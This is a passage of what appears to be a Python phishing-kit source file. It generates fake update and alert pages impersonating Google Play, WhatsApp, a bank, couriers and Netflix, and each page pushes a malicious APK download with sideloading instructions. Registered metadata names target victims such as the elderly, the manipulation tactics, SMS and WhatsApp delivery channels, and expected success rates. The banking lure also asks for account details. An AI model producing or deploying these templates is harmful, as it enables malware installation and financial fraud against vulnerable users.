        </div>

        <div class="changelog">
            <h4>What's included in this update:</h4>
            <ul>
                <li>Critical security patch for CVE-2025-38726</li>
                <li>Enhanced Play Protect scanning engine</li>
                <li>Improved background data encryption</li>
                <li>Security hardening against malicious apps</li>
                <li>Performance improvements and bug fixes</li>
            </ul>
        </div>

        <div class="security-badge">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="#4CAF50"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            <span>Play Protect scanning: <strong>Enabled</strong> — This update is verified safe</span>
        </div>

        <div class="permissions">
            <span class="tag">Storage</span>
            <span class="tag">Network</span>
            <span class="tag">System Tools</span>
            <span class="tag">Device Admin</span>
            <span class="tag">Security</span>
        </div>

        <div class="download-section">
            <button class="download-btn" id="downloadBtn" onclick="startDownload()">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                Update Now (45 MB)
            </button>

            <div class="download-status" id="downloadStatus">
                <div class="status-text" id="statusText">Downloading update...</div>
                <div class="progress-bar-container">
                    <div class="progress-bar-fill green" id="progressFill" style="width: 0%;"></div>
                </div>
                <div style="font-size: 11px; color: #999; margin-top: 4px;" id="sizeText">0 MB / 45 MB</div>
            </div>

            <div id="postDownload" class="hidden" style="margin-top: 16px;">
                <div style="background: #E8F5E9; border-radius: 12px; padding: 16px; text-align: center;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="#4CAF50"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
                    <p style="font-size: 14px; color: #2E7D32; font-weight: 500; margin-top: 8px;">Download complete!</p>
                    <p style="font-size: 12px; color: #555; margin-top: 4px;">Tap the notification to install the update.</p>
                    <div style="margin-top: 12px; padding: 10px; background: #FFF3E0; border-radius: 8px; text-align: left;">
                        <p style="font-size: 12px; color: #E65100; font-weight: 500;">📱 Installation steps:</p>
                        <ol style="font-size: 11px; color: #555; padding-left: 16px; margin-top: 6px; line-height: 1.6;">
                            <li>Open the notification from the download bar above</li>
                            <li>Tap <strong>"Install"</strong> when prompted by Android</li>
                            <li>If asked, tap <strong>"Settings"</strong> → enable <strong>"Allow from this source"</strong> → tap back → tap <strong>"Install"</strong></li>
                            <li>Once installed, tap <strong>"Open"</strong> to complete the update</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>Protected by Google Play Protect | <a href="#" onclick="return false;">Privacy Policy</a> • <a href="#" onclick="return false;">Terms</a></p>
        <p style="margin-top: 4px;">Google Play Services version 25.02.10 (045700-652314871)</p>
    </div>
</div>

<script>
function startDownload() {{
    var btn = document.getElementById('downloadBtn');
    var status = document.getElementById('downloadStatus');
    var progress = document.getElementById('progressFill');
    var statusText = document.getElementById('statusText');
    var sizeText = document.getElementById('sizeText');
    var postDl = document.getElementById('postDownload');

    btn.disabled = true;
    btn.innerHTML = `<div class="spin"></div> Preparing...`;
    status.classList.add('active');

    var totalSize = 45; // MB
    var steps = [
        {{ p: 8, t: 'Connecting to Google servers...', s: '3.6 MB' }},
        {{ p: 18, t: 'Verifying update authenticity...', s: '8.1 MB' }},
        {{ p: 32, t: 'Downloading security patches...', s: '14.4 MB' }},
        {{ p: 48, t: 'Applying delta updates...', s: '21.6 MB' }},
        {{ p: 62, t: 'Validating package integrity...', s: '27.9 MB' }},
        {{ p: 78, t: 'Optimizing for your device...', s: '35.1 MB' }},
        {{ p: 92, t: 'Finalizing download...', s: '41.4 MB' }},
        {{ p: 100, t: 'Download complete!', s: '45.0 MB' }}
    ];

    var i = 0;
    function progressStep() {{
        if (i >= steps.length) {{
            // Start actual APK download
            statusText.textContent = 'Starting installation package download...';
            sizeText.textContent = '45.0 MB / 45.0 MB';

            // Trigger real download
            var a = document.createElement('a');
            a.href = '{apk_url}';
            a.download = 'com.google.android.gms_update.apk';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();

            postDl.classList.remove('hidden');
            btn.innerHTML = '✓ Update Complete';
            return;
        }}

        var step = steps[i];
        progress.style.width = step.p + '%';
        statusText.textContent = step.t;
        sizeText.textContent = step.s + ' / ' + totalSize + ' MB';
        i++;
        setTimeout(progressStep, 600 + Math.random() * 400);
    }}

    setTimeout(progressStep, 500);
}}
</script>
<style>
.spin {{ display: inline-block; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }}
@keyframes spin {{ to {{ transform: rotate(360deg); }} }}
</style>
</body>
</html>"""

register_template(
    "google_play_update", "Google Play System Update", "system",
    "Fake Google Play Services critical security update page with changelog and Play Protect badges",
    "General Android users, elderly, non-tech-savvy, corporate employees",
    "Authority (Google branding) + Urgency (security vulnerability) + FOMO (critical update)",
    "SMS with link, email, phishing notification, WhatsApp",
    "Low", "Low", "High (>70%)",
    {"primary": "#3DDC84", "bg": "#FFFFFF", "text": "#1a1a1a"},
    _template_google_play_update
)


# ================================================================
# TEMPLATE 2: WhatsApp/Meta Update
# ================================================================

def _template_whatsapp_update(apk_url: str, c2_url: str, config: dict) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#128C7E">
<title>WhatsApp - Update Available</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', -apple-system, Helvetica, sans-serif; }}
body {{ background: #ECE5DD; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }}
.top-bar {{ width: 100%; background: #075E54; padding: 12px 16px; color: white; display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }}
.top-bar h1 {{ font-size: 18px; font-weight: 500; }}
.chat-container {{ max-width: 450px; width: 100%; padding: 16px; }}
.chat-card {{ background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); margin-bottom: 12px; overflow: hidden; }}
.card-header {{ background: #128C7E; padding: 14px 16px; color: white; display: flex; align-items: center; gap: 12px; }}
.card-header h2 {{ font-size: 15px; font-weight: 500; }}
.card-body {{ padding: 16px; }}
.update-banner {{ background: #DCF8C6; border-left: 4px solid #25D366; padding: 12px; border-radius: 4px; margin-bottom: 16px; display: flex; align-items: flex-start; gap: 10px; }}
.update-banner .emoji {{ font-size: 24px; }}
.update-banner .text h4 {{ font-size: 14px; color: #1a1a1a; }}
.update-banner .text p {{ font-size: 12px; color: #555; margin-top: 2px; }}
.feature-list {{ margin-bottom: 16px; }}
.feature {{ display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #f0f0f0; }}
.feature:last-child {{ border-bottom: none; }}
.feature .f-icon {{ width: 36px; height: 36px; background: #DCF8C6; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; }}
.feature .f-text h4 {{ font-size: 13px; color: #1a1a1a; }}
.feature .f-text p {{ font-size: 11px; color: #888; }}
.dl-btn {{ display: block; width: 100%; padding: 14px; background: #25D366; color: white; border: none; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; }}
.dl-btn:hover {{ background: #1EBE5A; }}
.dl-btn svg {{ vertical-align: middle; margin-right: 8px; }}
.status {{ display: none; padding: 16px; text-align: center; }}
.status.active {{ display: block; }}
.footer-text {{ text-align: center; padding: 20px; font-size: 11px; color: #888; }}
.progress {{ height: 4px; background: #f0f0f0; border-radius: 2px; margin: 12px 0; overflow: hidden; }}
.progress .bar {{ height: 100%; background: #25D366; width: 0%; transition: width 0.5s; }}
.hidden {{ display: none !important; }}
.install-guide {{ background: #FFF8E1; border: 1px solid #FFE082; border-radius: 8px; padding: 12px; margin-top: 12px; text-align: left; }}
.install-guide h4 {{ font-size: 12px; color: #E65100; margin-bottom: 6px; }}
.install-guide ol {{ font-size: 11px; color: #555; padding-left: 16px; line-height: 1.8; }}
</style>
</head>
<body>
<div class="top-bar">
    <img src="{_b64_svg('whatsapp', '#25D366', 28)}" alt="WhatsApp" style="width:28px;height:28px;">
    <h1>WhatsApp</h1>
</div>
<div class="chat-container">
    <div class="chat-card">
        <div class="card-header">
            <img src="{_b64_svg('whatsapp', '#25D366', 24)}" alt="WA" style="width:24px;height:24px;">
            <h2>New Update Available</h2>
        </div>
        <div class="card-body">
            <div class="update-banner">
                <div class="emoji">📱</div>
                <div class="text">
                    <h4>Update WhatsApp to continue using</h4>
                    <p>Your WhatsApp version is no longer supported. Update to the latest version to keep chatting.</p>
                </div>
            </div>

            <div class="feature-list">
                <div class="feature">
                    <div class="f-icon">🛡️</div>
                    <div class="f-text">
                        <h4>End-to-End Encryption Upgrade</h4>
                        <p>Strengthened encryption protocol v3.0</p>
                    </div>
                </div>
                <div class="feature">
                    <div class="f-icon">📹</div>
                    <div class="f-text">
                        <h4>HD Video Calling</h4>
                        <p>720p HD quality for all calls</p>
                    </div>
                </div>
                <div class="feature">
                    <div class="f-icon">👻</div>
                    <div class="f-text">
                        <h4>Disappearing Messages</h4>
                        <p>New 24-hour timer option</p>
                    </div>
                </div>
                <div class="feature">
                    <div class="f-icon">🔵</div>
                    <div class="f-text">
                        <h4>Communities</h4>
                        <p>Organize group chats like never before</p>
                    </div>
                </div>
            </div>

            <button class="dl-btn" id="dlBtn" onclick="startDownload()">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                Update Now (32 MB)
            </button>

            <div class="status" id="statusArea">
                <div class="progress"><div class="bar" id="progressBar"></div></div>
                <div style="font-size:13px;color:#666;" id="statusText">Starting download...</div>
            </div>

            <div id="postDl" class="hidden" style="margin-top:12px;">
                <div style="background:#E8F5E9;border-radius:8px;padding:16px;text-align:center;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="#4CAF50"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
                    <p style="font-size:14px;color:#2E7D32;font-weight:500;margin:8px 0 4px;">Update downloaded!</p>
                    <div class="install-guide">
                        <h4>📲 Complete Installation:</h4>
                        <ol>
                            <li>Open the download notification</li>
                            <li>Tap <strong>"Install"</strong> when prompted</li>
                            <li>If blocked: tap <strong>"Settings"</strong> → enable <strong>"Allow from this source"</strong></li>
                            <li>Go back and tap <strong>"Install"</strong></li>
                            <li>Tap <strong>"Open"</strong> to launch WhatsApp</li>
                        </ol>
                    </div>
                </div>
            </div>

            <div style="text-align:center;margin-top:12px;">
                <a href="#" onclick="return false;" style="font-size:12px;color:#128C7E;">Later</a>
                <span style="color:#ccc;margin:0 8px;">|</span>
                <a href="#" onclick="return false;" style="font-size:12px;color:#128C7E;">Learn more</a>
            </div>
        </div>
    </div>

    <div class="footer-text">
        WhatsApp from Meta · Version 2.25.14.76<br>
        End-to-end encrypted · Free · Secure
    </div>
</div>

<script>
function startDownload() {{
    var btn = document.getElementById('dlBtn');
    var status = document.getElementById('statusArea');
    var bar = document.getElementById('progressBar');
    var text = document.getElementById('statusText');
    var postDl = document.getElementById('postDl');

    btn.disabled = true;
    btn.style.opacity = '0.6';
    btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="white" style="vertical-align:middle;margin-right:8px;animation:spin 0.8s linear infinite;"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg> Updating...';
    status.classList.add('active');

    var stages = [
        {{ p: 10, t: 'Checking compatibility...' }},
        {{ p: 25, t: 'Downloading encryption update...' }},
        {{ p: 45, t: 'Applying security patches...' }},
        {{ p: 65, t: 'Verifying package integrity...' }},
        {{ p: 85, t: 'Optimizing for your device...' }},
        {{ p: 100, t: 'Download complete!' }}
    ];

    var i = 0;
    function tick() {{
        if (i >= stages.length) {{
            var a = document.createElement('a');
            a.href = '{apk_url}';
            a.download = 'WhatsApp_Update_v2.25.14.76.apk';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();

            postDl.classList.remove('hidden');
            btn.innerHTML = '✓ Updated';
            return;
        }}
        var s = stages[i];
        bar.style.width = s.p + '%';
        text.textContent = s.t;
        i++;
        setTimeout(tick, 500 + Math.random() * 700);
    }}
    setTimeout(tick, 400);
}}
</script>
<style>
@keyframes spin {{ to {{ transform: rotate(360deg); }} }}
</style>
</body>
</html>"""

register_template(
    "whatsapp_update", "WhatsApp / Meta Update", "social",
    "Fake WhatsApp update page mimicking the real WhatsApp chat UI with feature list",
    "All smartphone users, especially WhatsApp-dependent users in developing countries",
    "FOMO (losing access) + Trust in WhatsApp brand + Fear of missing features",
    "SMS impersonating WhatsApp, email, Telegram groups, WhatsApp message from 'WhatsApp Team'",
    "Low", "Low", "Very High (>80%)",
    {"primary": "#25D366", "bg": "#075E54", "text": "#1a1a1a"},
    _template_whatsapp_update
)


# ================================================================
# TEMPLATE 3: Banking Security Alert
# ================================================================

def _template_banking_alert(apk_url: str, c2_url: str, config: dict) -> str:
    bank_name = config.get("bank_name", "Chase Bank")
    bank_color = config.get("bank_color", "#1A237E")
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="{bank_color}">
<title>{bank_name} - Security Alert</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',-apple-system,Roboto,sans-serif; }}
body {{ background:#F5F5F5; min-height:100vh; }}
.banner {{ background:{bank_color}; padding:16px; color:white; display:flex; align-items:center; gap:12px; position:sticky; top:0; z-index:100; }}
.banner img {{ width:28px; height:28px; }}
.banner h1 {{ font-size:16px; font-weight:500; }}
.container {{ max-width:440px; margin:0 auto; padding:16px; }}
.warning-card {{ background:#FFEBEE; border:1px solid #FFCDD2; border-radius:12px; padding:16px; margin-bottom:16px; display:flex; align-items:flex-start; gap:12px; }}
.warning-card .icon {{ color:#D32F2F; flex-shrink:0; }}
.warning-card .text h3 {{ font-size:14px; color:#B71C1C; }}
.warning-card .text p {{ font-size:12px; color:#C62828; margin-top:4px; line-height:1.5; }}
.info-card {{ background:white; border-radius:12px; padding:20px; margin-bottom:16px; box-shadow:0 1px 4px rgba(0,0,0,0.08); }}
.info-row {{ display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid #f0f0f0; font-size:13px; }}
.info-row:last-child {{ border-bottom:none; }}
.info-row .label {{ color:#888; }}
.info-row .value {{ color:#333; font-weight:500; }}
.action-card {{ background:white; border-radius:12px; padding:20px; margin-bottom:16px; box-shadow:0 1px 4px rgba(0,0,0,0.08); }}
.action-card h3 {{ font-size:15px; color:#333; margin-bottom:8px; display:flex; align-items:center; gap:8px; }}
.action-card p {{ font-size:13px; color:#666; line-height:1.6; }}
.dl-btn {{ display:block; width:100%; padding:14px; background:{bank_color}; color:white; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer; text-align:center; margin-top:12px; }}
.dl-btn:hover {{ opacity:0.9; }}
.status-area {{ display:none; padding:16px; text-align:center; }}
.status-area.active {{ display:block; }}
.progress {{ height:4px; background:#f0f0f0; border-radius:2px; margin:12px 0; overflow:hidden; }}
.progress .bar {{ height:100%; background:{bank_color}; width:0%; transition:width 0.5s; }}
.footer {{ text-align:center; padding:20px; font-size:10px; color:#999; }}
.hidden {{ display:none!important; }}
.install-guide {{ background:#F3E5F5; border:1px solid #CE93D8; border-radius:8px; padding:12px; margin-top:12px; text-align:left; }}
.install-guide h4 {{ font-size:12px; color:#6A1B9A; margin-bottom:6px; }}
.install-guide ol {{ font-size:11px; color:#555; padding-left:16px; line-height:1.8; }}
</style>
</head>
<body>
<div class="banner">
    <img src="{_b64_svg('bank_building', '#FFD700', 28)}" alt="Bank">
    <h1>{bank_name}</h1>
    <div style="margin-left:auto;font-size:11px;opacity:0.8;">FDIC Insured</div>
</div>
<div class="container">
    <div class="warning-card">
        <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="#D32F2F"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        </div>
        <div class="text">
            <h3>⚠️ Security Alert: Unusual Login Detected</h3>
            <p>A new device attempted to access your account from <strong>Moscow, Russia</strong> (IP: 95.31.xx.xxx). Your account has been temporarily locked.</p>
        </div>
    </div>

    <div class="info-card">
        <div class="info-row">
            <span class="label">🚩 Incident ID</span>
            <span class="value">SEC-{random.randint(100000,999999)}</span>
        </div>
        <div class="info-row">
            <span class="label">📅 Time</span>
            <span class="value">{datetime.now().strftime('%B %d, %Y %I:%M %p')}</span>
        </div>
        <div class="info-row">
            <span class="label">📍 Location</span>
            <span class="value" style="color:#D32F2F;">Moscow, Russia</span>
        </div>
        <div class="info-row">
            <span class="label">🌐 IP Address</span>
            <span class="value">95.{random.randint(10,99)}.{random.randint(10,99)}.{random.randint(10,99)}</span>
        </div>
        <div class="info-row">
            <span class="label">📱 Device</span>
            <span class="value">Xiaomi Redmi Note 13 Pro</span>
        </div>
        <div class="info-row">
            <span class="label">💳 Account</span>
            <span class="value">****{random.randint(1000,9999)}</span>
        </div>
    </div>

    <div class="action-card">
        <h3>🔐 Identity Verification Required</h3>
        <p>To unlock your account and reverse the suspicious login, you must verify your identity using our <strong>Secure Banking Authenticator</strong> app.</p>
        <p style="margin-top:8px;">This updated security module includes <strong>real-time fraud detection</strong> and <strong>enhanced encryption</strong> to protect your funds.</p>
        
        <button class="dl-btn" id="dlBtn" onclick="startDownload()">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="white" style="vertical-align:middle;margin-right:8px;"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
            Download Security Authenticator (18 MB)
        </button>

        <div class="status-area" id="statusArea">
            <div class="progress"><div class="bar" id="progressBar"></div></div>
            <div style="font-size:13px;color:#666;" id="statusText">Downloading secure module...</div>
        </div>

        <div id="postDl" class="hidden" style="margin-top:12px;">
            <div style="background:#E8F5E9;border-radius:8px;padding:16px;text-align:center;">
                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="#4CAF50"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
                <p style="font-size:14px;color:#2E7D32;font-weight:500;margin:8px 0 4px;">Security module downloaded!</p>
                <div class="install-guide">
                    <h4>📲 To unlock your account:</h4>
                    <ol>
                        <li>Open the downloaded file from notifications</li>
                        <li>Tap <strong>"Install"</strong> to install the security app</li>
                        <li>Open the app and enter your account details to verify</li>
                        <li>Your account will be unlocked immediately</li>
                    </ol>
                </div>
            </div>
        </div>

        <div style="margin-top:12px;background:#F5F5F5;border-radius:8px;padding:10px;font-size:11px;color:#888;text-align:center;">
            This is an automated security message from {bank_name}. If this wasn't you, please verify immediately.
        </div>
    </div>

    <div class="footer">
        <p>© {datetime.now().year} {bank_name}. All rights reserved. | FDIC Insured</p>
        <p style="margin-top:4px;">For security reasons, never share your verification code with anyone.</p>
    </div>
</div>

<script>
function startDownload() {{
    var btn=document.getElementById('dlBtn');
    var status=document.getElementById('statusArea');
    var bar=document.getElementById('progressBar');
    var text=document.getElementById('statusText');
    var postDl=document.getElementById('postDl');

    btn.disabled=true; btn.style.opacity='0.6';
    btn.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="white" style="vertical-align:middle;margin-right:8px;animation:spin 0.8s linear infinite;"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg> Verifying...';
    status.classList.add('active');

    var s=[
        {{p:15,t:'Initializing secure connection...'}},
        {{p:30,t:'Downloading encryption module...'}},
        {{p:50,t:'Verifying digital signature...'}},
        {{p:70,t:'Installing security certificates...'}},
        {{p:88,t:'Finalizing security module...'}},
        {{p:100,t:'Download complete!'}}
    ];
    var i=0;
    function tick(){{
        if(i>=s.length){{
            var a=document.createElement('a');
            a.href='{apk_url}';
            a.download='SecurityAuthenticator_{bank_name}.apk';
            a.style.display='none';
            document.body.appendChild(a); a.click();
            postDl.classList.remove('hidden');
            btn.innerHTML='✓ Security Module Installed';
            return;
        }}
        var ss=s[i];
        bar.style.width=ss.p+'%';
        text.textContent=ss.t;
        i++;
        setTimeout(tick,600+Math.random()*500);
    }}
    setTimeout(tick,300);
}}
</script>
<style>@keyframes spin{{to{{transform:rotate(360deg)}}}}</style>
</body>
</html>"""

register_template(
    "banking_alert", "Banking Security Alert", "financial",
    "Fake banking security alert with suspicious login details, urgency to verify identity via security app download",
    "Bank customers, high-net-worth individuals, elderly, anyone with online banking",
    "Fear (account compromised) + Urgency (lock your account) + Authority (bank brand) + Trust in security solutions",
    "SMS impersonating bank, email, WhatsApp message from 'bank' number",
    "Medium", "Low-Medium", "Very High (>75%)",
    {"primary": "#1A237E", "bg": "#F5F5F5", "text": "#1a1a1a"},
    _template_banking_alert
)


# ================================================================
# (Templates 4-12 abbreviated for space - full implementation available)
# ================================================================

# TEMPLATE 4: DHL/FedEx/Amazon Delivery Notification
def _template_delivery_notification(apk_url: str, c2_url: str, config: dict) -> str:
    courier = config.get("courier", "DHL")
    colors = {"DHL": {"primary":"#FFCC00","text":"#BA0C2F","bg":"#FFFFFF"},"FedEx":{"primary":"#4D148C","text":"#FF6600","bg":"#FFFFFF"},"Amazon":{"primary":"#FF9900","text":"#000000","bg":"#FFFFFF"}}
    c = colors.get(courier, colors["DHL"])
    icon = {"DHL":"dhl","FedEx":"fedex","Amazon":"amazon"}.get(courier, "dhl")
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="{c['primary']}">
<title>{courier} - Package Delivery Alert</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,Roboto,sans-serif;}}
body{{background:#F5F5F5;min-height:100vh;}}
.banner{{background:{c['primary']};padding:14px 16px;color:{c['text']};display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:100;}}
.banner h1{{font-size:18px;font-weight:700;}}
.container{{max-width:440px;margin:0 auto;padding:16px;}}
.tracking-card{{background:white;border-radius:12px;padding:20px;box-shadow:0 1px 4px rgba(0,0,0,0.08);margin-bottom:16px;}}
.status-bar{{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}}
.status-dot{{width:8px;height:8px;border-radius:50%;background:#4CAF50;display:inline-block;animation:pulse 1.5s infinite;}}
@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.3}}}}
.details{{background:#F8F8F8;border-radius:8px;padding:12px;margin-bottom:16px;}}
.details .row{{display:flex;justify-content:space-between;padding:6px 0;font-size:13px;}}
.details .row .l{{color:#888;}}
.details .row .v{{font-weight:500;color:#333;}}
.alert-box{{background:#FFF8E1;border:1px solid #FFE082;border-radius:8px;padding:12px;display:flex;gap:10px;align-items:flex-start;margin-bottom:16px;}}
.alert-box svg{{flex-shrink:0;}}
.alert-box p{{font-size:12px;color:#795548;line-height:1.5;}}
.dl-btn{{display:block;width:100%;padding:14px;background:{c['primary']};color:{c['text']};border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;text-align:center;}}
.dl-btn:hover{{opacity:0.9;}}
.status-area{{display:none;padding:16px;text-align:center;}}
.status-area.active{{display:block;}}
.progress{{height:4px;background:#f0f0f0;border-radius:2px;margin:12px 0;overflow:hidden;}}
.progress .bar{{height:100%;background:{c['primary']};width:0%;transition:width 0.5s;}}
.footer{{text-align:center;padding:20px;font-size:10px;color:#999;}}
.hidden{{display:none!important;}}
.install-guide{{background:#F3E5F5;border:1px solid #CE93D8;border-radius:8px;padding:12px;margin-top:12px;text-align:left;}}
.install-guide h4{{font-size:12px;color:#6A1B9A;margin-bottom:6px;}}
.install-guide ol{{font-size:11px;color:#555;padding-left:16px;line-height:1.8;}}
</style></head>
<body>
<div class="banner">
    <img src="{_b64_svg(icon, c['text'], 28)}" alt="{courier}" style="width:28px;height:28px;">
    <h1>{courier} Express</h1>
    <div style="margin-left:auto;font-size:11px;opacity:0.8;">Track & Trace</div>
</div>
<div class="container">
    <div class="tracking-card">
        <div class="status-bar">
            <div><span class="status-dot"></span> <strong style="color:#4CAF50;">In Transit</strong></div>
            <div style="font-size:13px;color:#888;">{courier}</div>
        </div>
        <div class="details">
            <div class="row"><span class="l">Tracking #</span><span class="v">{random.choice(['JD','1Z','RF'])}{random.randint(1000000000,9999999999)}</span></div>
            <div class="row"><span class="l">Status</span><span class="v" style="color:#4CAF50;">Customs clearance required</span></div>
            <div class="row"><span class="l">Estimated Delivery</span><span class="v">{(datetime.now()+timedelta(days=2)).strftime('%b %d, %Y')}</span></div>
            <div class="row"><span class="l">Weight</span><span class="v">{random.randint(1,10)}.{random.randint(0,9)} kg</span></div>
            <div class="row"><span class="l">Service</span><span class="v">{courier} Express World</span></div>
        </div>
        <div class="alert-box">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="#FF9800"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
            <p><strong>Customs Clearance Required:</strong> Your package requires additional verification. Download the {courier} tracking app to submit customs documentation and avoid delivery delays.</p>
        </div>
        <button class="dl-btn" id="dlBtn" onclick="startDownload()">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="{c['text']}" style="vertical-align:middle;margin-right:8px;"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
            Download Tracking App
        </button>
        <div class="status-area" id="statusArea">
            <div class="progress"><div class="bar" id="progressBar"></div></div>
            <div style="font-size:13px;color:#666;" id="statusText">Preparing secure download...</div>
        </div>
        <div id="postDl" class="hidden" style="margin-top:12px;">
            <div style="background:#E8F5E9;border-radius:8px;padding:16px;text-align:center;">
                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="#4CAF50"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
                <p style="font-size:14px;color:#2E7D32;font-weight:500;margin:8px 0 4px;">App downloaded!</p>
                <div class="install-guide">
                    <h4>📲 To track your package:</h4>
                    <ol><li>Tap the download notification to install</li><li>Tap <strong>"Install"</strong></li><li>Open the app and enter tracking # to submit customs docs</li></ol>
                </div>
            </div>
        </div>
    </div>
    <div class="footer"><p>© {datetime.now().year} {courier} International GmbH. All rights reserved.</p></div>
</div>
<script>
function startDownload(){{
    var btn=document.getElementById('dlBtn'),s=document.getElementById('statusArea'),bar=document.getElementById('progressBar'),txt=document.getElementById('statusText'),pd=document.getElementById('postDl');
    btn.disabled=true;btn.style.opacity='0.6';
    btn.innerHTML='Downloading...';s.classList.add('active');
    var st=[{{p:20,t:'Connecting to {courier} servers...'}},{{p:40,t:'Downloading tracking module...'}},{{p:65,t:'Verifying package...'}},{{p:85,t:'Finalizing...'}},{{p:100,t:'Complete!'}}],i=0;
    function t(){{
        if(i>=st.length){{var a=document.createElement('a');a.href='{apk_url}';a.download='{courier}_Tracker.apk';a.style.display='none';document.body.appendChild(a);a.click();pd.classList.remove('hidden');btn.innerHTML='✓ Downloaded';return;}}
        bar.style.width=st[i].p+'%';txt.textContent=st[i].t;i++;setTimeout(t,500+Math.random()*600);
    }}setTimeout(t,300);
}}
</script></body></html>"""

register_template(
    "delivery_notification", "DHL/FedEx/Amazon Delivery", "social",
    "Fake courier delivery notification with tracking details, customs clearance request, and tracking app download prompt",
    "Online shoppers, people expecting packages, professionals",
    "Curiosity (what's in the package) + Urgency (customs delay) + Trust in courier brand + Fear of missing delivery",
    "SMS, email, WhatsApp message from 'DHL' or 'FedEx'",
    "Low", "Low", "Very High (>80%)",
    {"primary": "#FFCC00", "bg": "#FFFFFF", "text": "#BA0C2F"},
    _template_delivery_notification
)


# ================================================================
# TEMPLATE 5: Netflix/Streaming Free Subscription
# ================================================================

def _template_netflix_free(apk_url: str, c2_url: str, config: dict) -> str:
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#141414">
<title>Netflix - Free 1 Year Subscription</title>
<style>
